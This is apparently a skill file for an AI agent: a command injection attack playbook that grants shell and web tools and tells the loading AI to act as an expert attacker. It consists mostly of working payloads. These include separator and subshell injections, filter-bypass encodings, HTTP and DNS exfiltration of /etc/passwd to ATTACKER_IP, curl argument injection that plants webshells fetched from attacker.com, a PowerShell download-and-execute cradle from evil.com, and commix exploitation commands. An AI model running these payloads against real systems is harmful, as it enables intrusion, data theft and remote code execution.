---
name: cmdi-command-injection
description: Command injection playbook — detection (error-based/time-based/OOB), injection contexts (shell metacharacters, backtick/subshell, argument injection), bypass techniques (filtered characters, whitespace bypass, without spaces/quotes), blind command injection, OS command injection via different languages, and argument injection variants.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Command Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Command injection occurs when user input is passed to a shell command without sanitization. Covers all injection contexts, all major bypass techniques for filtered characters, and blind detection via timing/OOB. Base models often miss argument injection (injecting into command arguments, not the command itself) and the whitespace bypass variants.

## 0. RELATED ROUTING

- reverse-shell-techniques — after gaining command injection, escalate to reverse shell
- ssrf-hunter — if command injection is in a URL-fetching context
- path-traversal-lfi — often co-occurs with command injection in file processing

---

## 1. INJECTION CONTEXTS

### 1.1 Direct Shell Injection (Most Exploitable)

```bash
# App does: system("ping " + user_input)
# Injection:
; whoami
& whoami
| whoami
&& whoami
|| whoami
`whoami`
$(whoami)
```

### 1.2 PHP Command Execution Functions

```php
exec(), system(), shell_exec(), passthru(), popen()
proc_open(), pcntl_exec()
# Also: eval() with PHP code
```

### 1.3 Python Command Execution

```python
os.system(user_input)
os.popen(user_input)
subprocess.call(user_input, shell=True)  # shell=True is key
subprocess.Popen(user_input, shell=True)
# SAFE: subprocess.call(['cmd', 'arg1', arg2]) — no shell=True
```

---

## 2. INJECTION OPERATORS

| Operator | Behavior | Example |
|---|---|---|
| `;` | Separator — run A then B | `ping localhost; whoami` |
| `&&` | AND — run B only if A succeeds | `true && whoami` |
| `\|\|` | OR — run B only if A fails | `false \|\| whoami` |
| `\|` | Pipe — A's output to B | `echo test \| whoami` (whoami ignores stdin) |
| `\`` (backtick) | Subshell inline | `` ping `whoami`.attacker.com `` |
| `$()` | Subshell inline | `ping $(whoami).attacker.com` |
| `\n` (newline) | Command separator | `ping\nwhoami` |
| `%0a` (URL-encoded newline) | Command separator in URLs | `GET /?host=localhost%0awhoami` |

---

## 3. BLIND COMMAND INJECTION

When there's no output visible in the response.

### Time-Based Detection

```bash
# Linux — sleep 10 seconds if injection works:
; sleep 10
&& sleep 10
| sleep 10
$(sleep 10)
`sleep 10`
' ; sleep 10 ;'
127.0.0.1 && sleep 10 #

# Windows:
& timeout /t 10
& ping -n 10 127.0.0.1
```

### Out-of-Band (DNS) Detection

```bash
# Using Burp Collaborator or interactsh:
; nslookup `whoami`.BURP_COLLABORATOR.com
; curl http://BURP_COLLABORATOR.com/$(whoami)
; wget http://BURP_COLLABORATOR.com/?x=$(id|base64)
$(nslookup $(whoami).COLLABORATOR.com)
```

### Out-of-Band (HTTP) Exfiltration

```bash
# Exfiltrate command output via HTTP request:
; curl -d "output=$(id)" http://ATTACKER_IP/collect
; wget "http://ATTACKER_IP/collect?data=$(cat /etc/passwd | base64)"
```

---

## 4. FILTER BYPASS TECHNIQUES

### 4.1 Without Spaces

```bash
# Using $IFS (Internal Field Separator = space by default)
cat$IFS/etc/passwd
ls$IFS-la

# Using brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Using tabs
cat	/etc/passwd     # \t instead of space

# Using redirect
cat</etc/passwd
cat<>/etc/passwd
```

### 4.2 Without Quotes

```bash
# Single-char commands that don't need quotes
cat /etc/passwd
# Using wildcards
cat /etc/pa??wd
cat /etc/pass*
cat /etc/p?ss?d
```

### 4.3 Blacklisted Keywords

```bash
# Keyword: "cat" blocked
# Alternatives:
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
rev /etc/passwd | rev    # rev reverses, double-rev restores
od -c /etc/passwd         # octal dump
xxd /etc/passwd           # hex dump
strings /etc/passwd
tac /etc/passwd           # reverse cat

# Keyword: "whoami" blocked
id
w
who
```

### 4.4 Character Encoding Bypass

```bash
# Hex encoding
echo -e '\x77\x68\x6f\x61\x6d\x69' | bash    # whoami
$(echo 77686f616d69 | xxd -r -p)              # whoami via hex

# Base64
echo d2hvYW1p | base64 -d | bash               # whoami

# Using printf
printf '\167\150\157\141\155\151' | bash       # octal whoami

# Using variables
x=who;a=ami;$x$a    # whoami split across variables
w$@ho$@ami           # Using $@ (empty string by default)
```

### 4.5 Slash Bypass

```bash
# When / is filtered:
cat ${PATH%%u*}etc${PATH%%u*}passwd
# or
echo "cat /etc/passwd" | sed 's/X/\//g' | bash  # if X → /

# Using environment variables containing /
${HOME%/root}/etc/passwd    # if HOME=/root → /etc/passwd
```

---

## 5. ARGUMENT INJECTION

Injecting into command arguments (not adding new commands) to achieve unexpected behavior.

### Git Argument Injection

```bash
# App does: git clone $user_input
# Inject: --upload-pack=calc.exe (Windows) or:
--upload-pack=touch /tmp/pwned
# Or: 
-u /tmp/evil.sh
```

### cURL Argument Injection

```bash
# App does: curl $user_input
# SSRF via flag injection:
-o /var/www/html/shell.php http://attacker.com/shell.php
-F file=@/etc/passwd http://attacker.com/collect
--config /etc/evil.curlrc

# Example in URL input: 
http://target.com/fetch?url=http://localhost/admin+-o+/var/www/html/evil.php+http://attacker.com/webshell.php
```

### Rsync Argument Injection

```bash
# App does: rsync $src $dst
# Inject via -e flag (custom rsh):
-e 'sh -c "id > /tmp/out"' /dev/null .
```

### ffmpeg Argument Injection

```bash
# Server-side video processing with SSRF via HLS:
-i http://SSRF_target/secret.m3u8
```

---

## 6. PLATFORM-SPECIFIC PATTERNS

### Windows Command Injection

```batch
# Separators:
& dir
&& dir
| dir
%0a dir

# Operators without space:
dir,C:\
dir/s/b+C:\

# Env var tricks:
%COMSPEC% /c whoami
cmd /c whoami
```

### PowerShell Injection

```powershell
# Common PowerShell one-liners for CMDi:
; powershell -c "whoami"
; powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')
```

---

## 7. AUTOMATED DETECTION

### CommixTool

```bash
# Automated command injection detection and exploitation:
python3 commix.py -u "https://target.com/vuln?param=test" --all
python3 commix.py --url="https://target.com" --data="ip=127.0.0.1&submit=ping"
python3 commix.py --url "https://target.com/vuln" -p "param" --os-cmd="id"
```

---

## 8. TESTING CHECKLIST

```
□ Map all parameters that might be passed to OS commands
□ Test with ;id, &&id, |id (look for id output in response)
□ Test time-based: ; sleep 10 (look for 10-second delay)
□ Test OOB: ; nslookup BURP_COLLABORATOR.com
□ If semicolons blocked, try &&, ||, |, \n, %0a
□ If spaces blocked, try $IFS, {cmd,arg}, <, tabs
□ Check if cat/ls/etc. blocked → try alternatives
□ Test argument injection in file paths, URLs, identifiers
□ Test Windows-specific operators on Windows targets (&, &&, |)
□ Automate with commix for comprehensive coverage
```

---

## 9. QUICK PAYLOAD REFERENCE

```bash
# Top 10 initial probes:
; whoami
& whoami
| whoami
`whoami`
$(whoami)
%26whoami
%3Bwhoami
127.0.0.1;whoami
1;id
' || id || '

# Blind time-based:
; sleep 10
&& sleep 10
| sleep 10
127.0.0.1 && sleep 10 #

# OOB (replace COLLAB with Burp Collaborator):
; curl COLLAB
; nslookup COLLAB
; ping -c 1 COLLAB
```
